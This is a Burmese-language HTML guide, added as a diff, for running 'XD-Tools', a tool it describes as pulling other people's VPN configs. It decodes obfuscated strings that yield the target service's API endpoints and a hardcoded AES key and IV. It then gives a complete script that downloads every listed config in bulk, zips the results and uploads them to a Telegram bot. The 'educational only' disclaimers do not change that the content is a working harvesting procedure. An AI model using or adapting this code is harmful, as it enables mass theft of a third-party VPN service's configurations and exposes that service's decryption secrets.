@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XD-Tools စမ်းသပ်ရေး လမ်းညွှန်</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Noto Sans Myanmar", sans-serif;
+    background: #0d1117;
+    color: #c9d1d9;
+    margin: 0;
+    padding: 0;
+    line-height: 1.7;
+  }
+  .container { max-width: 900px; margin: 0 auto; padding: 20px; }
+  header {
+    background: linear-gradient(135deg, #1f6feb 0%, #8957e5 100%);
+    padding: 40px 20px;
+    text-align: center;
+    border-radius: 0 0 20px 20px;
+    margin-bottom: 30px;
+  }
+  header h1 { margin: 0 0 10px; font-size: 28px; color: #fff; }
+  header p { margin: 0; color: #e6edf3; opacity: 0.9; }
+  .warning {
+    background: #3d1e1e;
+    border-left: 4px solid #f85149;
+    padding: 15px 20px;
+    border-radius: 8px;
+    margin: 20px 0;
+  }
+  .warning strong { color: #f85149; }
+  .info {
+    background: #1c2d3f;
+    border-left: 4px solid #58a6ff;
+    padding: 15px 20px;
+    border-radius: 8px;
+    margin: 20px 0;
+  }
+  .info strong { color: #58a6ff; }
+  .success {
+    background: #1e3a2a;
+    border-left: 4px solid #3fb950;
+    padding: 15px 20px;
+    border-radius: 8px;
+    margin: 20px 0;
+  }
+  h2 {
+    color: #58a6ff;
+    border-bottom: 1px solid #30363d;
+    padding-bottom: 10px;
+    margin-top: 40px;
+  }
+  h3 { color: #79c0ff; margin-top: 25px; }
+  .step {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 10px;
+    padding: 20px;
+    margin: 20px 0;
+  }
+  .step-num {
+    display: inline-block;
+    background: #1f6feb;
+    color: #fff;
+    width: 32px; height: 32px;
+    border-radius: 50%;
+    text-align: center;
+    line-height: 32px;
+    font-weight: bold;
+    margin-right: 10px;
+  }
+  .code-block {
+    position: relative;
+    background: #0d1117;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    margin: 15px 0;
+    overflow: hidden;
+  }
+  .code-header {
+    background: #161b22;
+    padding: 8px 15px;
+    border-bottom: 1px solid #30363d;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    color: #8b949e;
+  }
+  .copy-btn {
+    background: #21262d;
+    color: #c9d1d9;
+    border: 1px solid #30363d;
+    border-radius: 6px;
+    padding: 4px 12px;
+    cursor: pointer;
+    font-size: 12px;
+    transition: all 0.2s;
+  }
+  .copy-btn:hover { background: #30363d; }
+  .copy-btn.copied { background: #238636; border-color: #238636; color: #fff; }
+  pre {
+    margin: 0;
+    padding: 15px;
+    overflow-x: auto;
+    font-family: "SF Mono", Consolas, "Liberation Mono", monospace;
+    font-size: 13px;
+    line-height: 1.6;
+  }
+  code { color: #e6edf3; }
+  .comment { color: #8b949e; }
+  .string { color: #a5d6ff; }
+  .keyword { color: #ff7b72; }
+  ul, ol { padding-left: 25px; }
+  li { margin: 8px 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 15px 0;
+    background: #161b22;
+    border-radius: 8px;
+    overflow: hidden;
+  }
+  th, td {
+    padding: 10px 15px;
+    text-align: left;
+    border-bottom: 1px solid #30363d;
+  }
+  th { background: #1f6feb; color: #fff; }
+  tr:last-child td { border-bottom: none; }
+  .badge {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 12px;
+    font-size: 12px;
+    font-weight: bold;
+  }
+  .badge-red { background: #f85149; color: #fff; }
+  .badge-green { background: #3fb950; color: #fff; }
+  .badge-yellow { background: #d29922; color: #fff; }
+  footer {
+    text-align: center;
+    padding: 40px 20px;
+    color: #8b949e;
+    font-size: 13px;
+    border-top: 1px solid #30363d;
+    margin-top: 40px;
+  }
+  .toc {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 10px;
+    padding: 20px;
+    margin: 20px 0;
+  }
+  .toc a { color: #58a6ff; text-decoration: none; }
+  .toc a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<header>
+  <h1>🛠️ XD-Tools စမ်းသပ်ရေး လမ်းညွှန်</h1>
+  <p>VPS အသစ်မှာ အဆင့်ဆင့် စမ်းသပ်ရန် အပြည့်အစုံ guide</p>
+</header>
+
+<div class="warning">
+  <strong>⚠️ အရေးကြီး သတိပေးချက်</strong><br>
+  ဒီ guide က <b>ပညာရေး/ဗဟုသုတ ရည်ရွယ်ချက်</b> အတွက်ပဲ။ XD-Tools က တခြားသူတွေရဲ့ VPN config တွေကို ဆွဲယူတဲ့ tool ဖြစ်တာမို့ —
+  <ul>
+    <li>သီးသန့် <b>test VPS</b> (data မရှိတဲ့) မှာပဲ run ပါ</li>
+    <li>Config တွေကို ဖြန့်ဝေတာ၊ ရောင်းတာ၊ app ထဲ ထည့်တာ <b>မလုပ်ပါနဲ့</b></li>
+    <li>စမ်းပြီးရင် VPS ကို <b>ဖျက်ပစ်ပါ</b> (ဒါမှမဟုတ် snapshot ယူပြီး destroy)</li>
+    <li>Bot token ကို လူမမြင်ရတဲ့ နေရာမှာ ထားပါ</li>
+  </ul>
+</div>
+
+<div class="toc">
+  <strong>📑 မာတိကာ</strong>
+  <ol>
+    <li><a href="#step1">VPS အသစ် ပြင်ဆင်ခြင်း</a></li>
+    <li><a href="#step2">Python နဲ့ tools install</a></li>
+    <li><a href="#step3">Folder ဆောက်ခြင်း</a></li>
+    <li><a href="#step4">Virtual environment</a></li>
+    <li><a href="#step5">pycryptodome install</a></li>
+    <li><a href="#step6">XD-Tools.py တင်ခြင်း</a></li>
+    <li><a href="#step7">Deobfuscate စစ်ဆေးခြင်း</a></li>
+    <li><a href="#step8">Config list စမ်းခြင်း</a></li>
+    <li><a href="#step9">Telegram Bot ဆောက်ခြင်း</a></li>
+    <li><a href="#step10">Bot script ရေးခြင်း</a></li>
+    <li><a href="#step11">Run ခြင်း</a></li>
+    <li><a href="#step12">ပြီးရင် လုပ်ရမယ့် အဆင့်</a></li>
+  </ol>
+</div>
+
+<!-- ==================== STEP 1 ==================== -->
+<h2 id="step1">အဆင့် ၁ — VPS အသစ် ပြင်ဆင်ခြင်း</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>VPS ကို SSH နဲ့ ချိတ်ပါ</strong>
+  <p>Termius ကနေ VPS အသစ်ကို ချိတ်ပါ။ ပြီးရင် update/upgrade လုပ်ပါ:</p>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>apt update && apt upgrade -y</code></pre>
+  </div>
+</div>
+
+<!-- ==================== STEP 2 ==================== -->
+<h2 id="step2">အဆင့် ၂ — Python နဲ့ tools install</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>လိုအပ်တဲ့ packages install လုပ်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>apt install -y python3 python3-pip python3-venv nano curl tmux unzip</code></pre>
+  </div>
+</div>
+
+<div class="step">
+  <span class="step-num">2</span><strong>Version စစ်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>python3 --version
+pip3 --version</code></pre>
+  </div>
+  <p>Python 3.10+ ရှိရမယ်။</p>
+</div>
+
+<!-- ==================== STEP 3 ==================== -->
+<h2 id="step3">အဆင့် ၃ — Folder ဆောက်ခြင်း</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>သီးသန့် folder ဆောက်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>mkdir -p /opt/xd-test && cd /opt/xd-test
+pwd && ls -la</code></pre>
+  </div>
+</div>
+
+<!-- ==================== STEP 4 ==================== -->
+<h2 id="step4">အဆင့် ၄ — Virtual environment</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>venv ဆောက်ပြီး activate လုပ်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>python3 -m venv venv
+source venv/bin/activate
+which python3 && python3 --version</code></pre>
+  </div>
+  <p><span class="badge badge-green">✓</span> Terminal အစမှာ <code>(venv)</code> ပေါ်ရမယ်။</p>
+</div>
+
+<!-- ==================== STEP 5 ==================== -->
+<h2 id="step5">အဆင့် ၅ — pycryptodome install</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>AES library install လုပ်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>pip install pycryptodome requests
+python3 -c "from Crypto.Cipher import AES; print('AES OK')"
+python3 -c "import requests; print('requests OK')"</code></pre>
+  </div>
+  <p><span class="badge badge-green">✓</span> <code>AES OK</code> နဲ့ <code>requests OK</code> ပေါ်ရမယ်။</p>
+</div>
+
+<!-- ==================== STEP 6 ==================== -->
+<h2 id="step6">အဆင့် ၆ — XD-Tools.py တင်ခြင်း</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>SFTP ဒါမှမဟုတ် nano နဲ့ တင်ပါ</strong>
+  <p><b>နည်းလမ်း (က)</b> — Termius SFTP နဲ့ <code>/opt/xd-test/</code> ထဲ <code>XD-Tools.py</code> ကို drag &amp; drop</p>
+  <p><b>နည်းလမ်း (ခ)</b> — nano နဲ့ ကိုယ်တိုင်ရေးပါ:</p>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>nano XD-Tools.py
+# ကုဒ်တွေ paste လုပ်ပါ
+# Ctrl+O → Enter → Ctrl+X</code></pre>
+  </div>
+</div>
+
+<div class="step">
+  <span class="step-num">2</span><strong>ဖိုင် ရှိမရှိ စစ်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>ls -la /opt/xd-test/</code></pre>
+  </div>
+</div>
+
+<!-- ==================== STEP 7 ==================== -->
+<h2 id="step7">အဆင့် ၇ — Deobfuscate စစ်ဆေးခြင်း</h2>
+
+<div class="info">
+  <strong>ℹ️ ဒါက အရေးအကြီးဆုံး အဆင့်</strong><br>
+  ကုဒ်ကို run မလုပ်ခင် ဘယ် URL/key တွေ သုံးနေလဲ သိရမယ်။
+</div>
+
+<div class="step">
+  <span class="step-num">1</span><strong>check.py ဖိုင် ဆောက်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>nano check.py</code></pre>
+  </div>
+</div>
+
+<div class="step">
+  <span class="step-num">2</span><strong>အောက်က ကုဒ်ကို paste လုပ်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>check.py</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>def _qaaa7b7(_v):
+    return bytes((_c ^ 73 for _c in _v)).decode()
+
+print("URL1:", _qaaa7b7([33, 61, 61, 57, 58, 115, 102, 102, 49, 45, 100, 57, 58, 100, 40, 57, 32, 100, 58, 57, 32, 39, 39, 44, 59, 103, 63, 44, 59, 42, 44, 37, 103, 40, 57, 57, 102, 44, 121, 121, 125, 61, 33, 103, 35, 58]))
+print("URL2:", _qaaa7b7([33, 61, 61, 57, 58, 115, 102, 102, 49, 45, 100, 57, 58, 100, 40, 57, 32, 100, 44, 39, 51, 103, 63, 44, 59, 42, 44, 37, 103, 40, 57, 57, 102, 49, 45, 36, 40, 58, 61, 44, 59, 45, 44, 42, 38, 45, 44]))
+print("URL3:", _qaaa7b7([33, 61, 61, 57, 115, 102, 102, 49, 45, 100, 57, 58, 100, 40, 57, 32, 100, 61, 49, 61, 103, 63, 44, 59, 42, 44, 37, 103, 40, 57, 57, 102, 49, 45, 32, 36, 57, 38, 59, 22, 45, 44, 42, 44, 48, 57, 61]))
+print("AES KEY:", _qaaa7b7([57, 38, 32, 60, 48, 61, 59, 44, 62, 56, 40, 58, 98, 116, 55, 103]))
+print("AES IV :", _qaaa7b7([59, 125, 61, 46, 63, 122, 43, 123, 51, 42, 36, 45, 30, 127, 19, 103]))
+print("HDR_NAME:", _qaaa7b7([28, 58, 44, 59, 100, 8, 46, 44, 39, 61]))
+print("HDR_VAL :", _qaaa7b7([40, 57, 57, 37, 32, 42, 40, 61, 32, 38, 39, 102, 35, 58, 38, 39]))
+print("API_PARAM:", _qaaa7b7([63, 57, 39, 22, 39, 40, 36, 44]))
+print("BOT_VAL :", _qaaa7b7([22, 22, 49, 45, 22, 37, 32, 58, 61, 22, 22]))
+print("DEFAULT_IP:", _qaaa7b7([102, 58, 61, 38, 59, 40, 46, 44, 102, 44, 36, 60, 37, 40, 61, 44, 45, 102, 121, 102, 31, 25, 7, 58, 102, 15, 60, 42, 34, 100, 17, 13, 100, 29, 38, 38, 37, 58, 102]))</code></pre>
+  </div>
+</div>
+
+<div class="step">
+  <span class="step-num">3</span><strong>run ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>python3 check.py</code></pre>
+  </div>
+</div>
+
+<div class="step">
+  <span class="step-num">4</span><strong>ရလာတဲ့ output ကို မှတ်ထားပါ</strong>
+  <p>ဒီလို ရမယ်:</p>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Output (ဥပမာ)</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>URL1: https://xd-ps-api-spinner.vercel.app/e004th.js
+URL2: https://xd-ps-api-enz.vercel.app/xdmasterdecode
+URL3: http://xd-ps-api-txt.vercel.app/xdimpor_deceypt
+AES KEY: poiuytrewqas+=~.
+AES IV : r4tgv3b2zcmdW6Z.
+DEFAULT_IP: /storage/emulated/0/VPNs/Fuck-XD-Tools/</code></pre>
+  </div>
+</div>
+
+<!-- ==================== STEP 8 ==================== -->
+<h2 id="step8">အဆင့် ၈ — Config list စမ်းခြင်း</h2>
+
+<div class="warning">
+  <strong>⚠️ သတိထားပါ</strong><br>
+  ဒီအဆင့်က remote server ဆီ request ပို့မယ်။ သီးသန့် test VPS မှာပဲ လုပ်ပါ။
+</div>
+
+<div class="step">
+  <span class="step-num">1</span><strong>List ဆွဲကြည့်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>cd /opt/xd-test
+source venv/bin/activate
+python3 XD-Tools.py --list</code></pre>
+  </div>
+  <p><span class="badge badge-green">✓</span> နာမည် ၂၄၇ ခုလောက် ပေါ်လာရမယ်။</p>
+</div>
+
+<div class="step">
+  <span class="step-num">2</span><strong>Config တစ်ခု စမ်းကြည့်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>python3 XD-Tools.py --name "SIAM VPN" --out ./output
+ls -la output/</code></pre>
+  </div>
+</div>
+
+<!-- ==================== STEP 9 ==================== -->
+<h2 id="step9">အဆင့် ၉ — Telegram Bot ဆောက်ခြင်း</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>@BotFather ကို ဖွင့်ပါ</strong>
+  <p>Telegram မှာ <code>@BotFather</code> ကို ရှာပါ။</p>
+</div>
+
+<div class="step">
+  <span class="step-num">2</span><strong>Bot အသစ် ဆောက်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Telegram</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>/newbot</code></pre>
+  </div>
+  <p>Bot နာမည် နဲ့ username ပေးပါ။ BotFather က <b>token</b> တစ်ခု ပေးမယ် (ဥပမာ <code>123456:ABC-DEF...</code>)။ သိမ်းထားပါ။</p>
+</div>
+
+<div class="step">
+  <span class="step-num">3</span><strong>Chat ID ရှာပါ</strong>
+  <p>ညီလေး bot ကို <code>/start</code> ပို့ပါ။ ပြီးရင် browser မှာ ဒီ URL ဖွင့်ပါ (token နဲ့ အစားထိုး):</p>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Browser URL</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code></pre>
+  </div>
+  <p>ရလာတဲ့ JSON ထဲမှာ <code>"chat":{"id":123456789,...}</code> ဆိုတာ ရှာပါ။ အဲဒီ <code>123456789</code> က Chat ID ပါ။</p>
+</div>
+
+<!-- ==================== STEP 10 ==================== -->
+<h2 id="step10">အဆင့် ၁၀ — Bot script ရေးခြင်း</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>send_to_telegram.py ဖိုင် ဆောက်ပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>cd /opt/xd-test
+source venv/bin/activate
+nano send_to_telegram.py</code></pre>
+  </div>
+</div>
+
+<div class="step">
+  <span class="step-num">2</span><strong>အောက်က ကုဒ်ကို paste လုပ်ပါ</strong>
+  <p><b>ညီလေး token နဲ့ chat id ကို အစားထိုးဖို့ မမေ့ပါနဲ့။</b></p>
+  <div class="code-block">
+    <div class="code-header">
+      <span>send_to_telegram.py</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>#!/usr/bin/env python3
+import os, sys, zipfile, subprocess, requests
+
+# ===== ညီလေး အချက်အလက် ထည့်ပါ =====
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+CHAT_ID   = "YOUR_CHAT_ID_HERE"
+# =====================================
+
+WORK_DIR = "/opt/xd-test"
+OUT_DIR  = os.path.join(WORK_DIR, "output")
+ZIP_PATH = os.path.join(WORK_DIR, "vpn_configs.zip")
+TOOL     = os.path.join(WORK_DIR, "XD-Tools.py")
+PYTHON   = os.path.join(WORK_DIR, "venv", "bin", "python3")
+
+def tg_send_message(text):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    try:
+        r = requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=30)
+        if not r.ok:
+            print(f"[!] sendMessage: {r.text}", file=sys.stderr)
+    except Exception as e:
+        print(f"[!] sendMessage: {e}", file=sys.stderr)
+
+def tg_send_document(path, caption=""):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+    try:
+        with open(path, "rb") as f:
+            r = requests.post(url, data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f}, timeout=300)
+        return r.ok
+    except Exception as e:
+        print(f"[!] sendDocument: {e}", file=sys.stderr)
+        return False
+
+def get_names():
+    res = subprocess.run([PYTHON, TOOL, "--list"], capture_output=True, text=True)
+    if res.returncode != 0:
+        tg_send_message(f"❌ List failed:\n&lt;pre&gt;{res.stderr[:500]}&lt;/pre&gt;")
+        sys.exit(1)
+    names = []
+    for line in res.stdout.splitlines():
+        line = line.strip()
+        if not line or line.startswith("["):
+            continue
+        names.append(line)
+    return names
+
+def download_all(names):
+    os.makedirs(OUT_DIR, exist_ok=True)
+    ok, fail = 0, 0
+    for i, name in enumerate(names, 1):
+        print(f"[{i}/{len(names)}] {name}")
+        r = subprocess.run([PYTHON, TOOL, "--name", name, "--out", OUT_DIR],
+                           capture_output=True, text=True)
+        if r.returncode == 0:
+            ok += 1
+        else:
+            fail += 1
+            print(f"  [!] {name}: {r.stderr.strip()[:150]}")
+    return ok, fail
+
+def make_zip():
+    if os.path.exists(ZIP_PATH):
+        os.remove(ZIP_PATH)
+    with zipfile.ZipFile(ZIP_PATH, "w", zipfile.ZIP_DEFLATED) as zf:
+        for root, _, files in os.walk(OUT_DIR):
+            for fn in files:
+                full = os.path.join(root, fn)
+                zf.write(full, os.path.relpath(full, OUT_DIR))
+    return os.path.getsize(ZIP_PATH) / (1024 * 1024)
+
+def main():
+    tg_send_message("🚀 &lt;b&gt;XD-Tools started&lt;/b&gt;")
+    names = get_names()
+    if not names:
+        tg_send_message("❌ No configs.")
+        return
+    tg_send_message(f"📥 Downloading &lt;b&gt;{len(names)}&lt;/b&gt; configs...")
+    ok, fail = download_all(names)
+    size_mb = make_zip()
+    caption = f"✅ &lt;b&gt;VPN Configs&lt;/b&gt;\n📦 {ok} ok, {fail} failed\n💾 {size_mb:.2f} MB"
+    if size_mb &gt; 50:
+        tg_send_message(f"⚠️ ZIP {size_mb:.2f} MB — splitting...")
+        part_size = 45 * 1024 * 1024
+        with open(ZIP_PATH, "rb") as f:
+            idx = 1
+            while True:
+                chunk = f.read(part_size)
+                if not chunk:
+                    break
+                pp = f"{ZIP_PATH}.part{idx:02d}"
+                with open(pp, "wb") as pf:
+                    pf.write(chunk)
+                tg_send_document(pp, f"Part {idx}\n{caption}")
+                os.remove(pp)
+                idx += 1
+        tg_send_message("✅ All parts sent.")
+    else:
+        if tg_send_document(ZIP_PATH, caption):
+            tg_send_message("✅ &lt;b&gt;Done!&lt;/b&gt;")
+        else:
+            tg_send_message("❌ Upload failed.")
+
+if __name__ == "__main__":
+    main()</code></pre>
+  </div>
+</div>
+
+<!-- ==================== STEP 11 ==================== -->
+<h2 id="step11">အဆင့် ၁၁ — Run ခြင်း</h2>
+
+<div class="step">
+  <span class="step-num">1</span><strong>Bot စမ်းပါ</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>python3 -c "
+import requests
+r = requests.post('https://api.telegram.org/botYOUR_TOKEN/sendMessage',
+                  data={'chat_id':'YOUR_CHAT_ID','text':'✅ Test from VPS'})
+print(r.json())
+"</code></pre>
+  </div>
+  <p><span class="badge badge-green">✓</span> <code>{'ok': True, ...}</code> ပြန်လာရင် bot အလုပ်လုပ်တယ်။</p>
+</div>
+
+<div class="step">
+  <span class="step-num">2</span><strong>tmux ထဲမှာ run ပါ (Termius ပိတ်သွားရင် ဆက်အလုပ်လုပ်ဖို့)</strong>
+  <div class="code-block">
+    <div class="code-header">
+      <span>Terminal</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>tmux new -s xd
+cd /opt/xd-test
+source venv/bin/activate
+python3 send_to_telegram.py
+# Ctrl+B ပြီး D နှိပ်ပြီး detach
+# ပြန်ကြည့်ချင်ရင်: tmux attach -t xd</code></pre>
+  </div>
+</div>
+
+<!-- ==================== STEP 12 ==================== -->
+<h2 id="step12">အဆင့် ၁၂ — ပြီးရင် လုပ်ရမယ့် အဆင့်</h2>
+
+<div class="success">
+  <strong>✅ စမ်းသပ်ပြီးရင်</strong>
+  <ul>
+    <li><b>VPS ကို ဖျက်ပစ်ပါ</b> (ဒါမှမဟုတ် snapshot ယူပြီး destroy)</li>
+    <li>Bot token ကို <code>@BotFather</code> မှာ <code>/revoke</code> နဲ့ ပြောင်းပါ</li>
+    <li>သိမ်းထားတဲ့ config တွေကို <b>ဖြန့်ဝေတာ၊ ရောင်းတာ မလုပ်ပါနဲ့</b></li>
+    <li>ရလာတဲ့ ဗဟုသုတကို ကိုယ်ပိုင် VPN server ဆောက်ဖို့ သုံးပါ</li>
+  </ul>
+</div>
+
+<div class="info">
+  <strong>💡 ပိုကောင်းတဲ့ လမ်း</strong><br>
+  ကိုယ်ပိုင် VPN app အတွက် config လိုချင်ရင် — ကိုယ်ပိုင် Xray/WireGuard server ဆောက်ပါ။
+  <div class="code-block">
+    <div class="code-header">
+      <span>Xray install</span>
+      <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+    </div>
+    <pre><code>bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install</code></pre>
+  </div>
+</div>
+
+<footer>
+  <p>📚 ပညာရေးရည်ရွယ်ချက်အတွက်သာ — တရားဝင်နည်းလမ်းနဲ့ သုံးပါ</p>
+  <p>Made for ZeroVPN testing · 2026</p>
+</footer>
+
+</div>
+
+<script>
+function copyCode(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre code');
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✅ Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = '📋 Copy';
+      btn.classList.remove('copied');
+    }, 2000);
+  }).catch(err => {
+    btn.textContent = '❌ Failed';
+    setTimeout(() => btn.textContent = '📋 Copy', 2000);
+  });
+}
+</script>
+</body>
+</html>
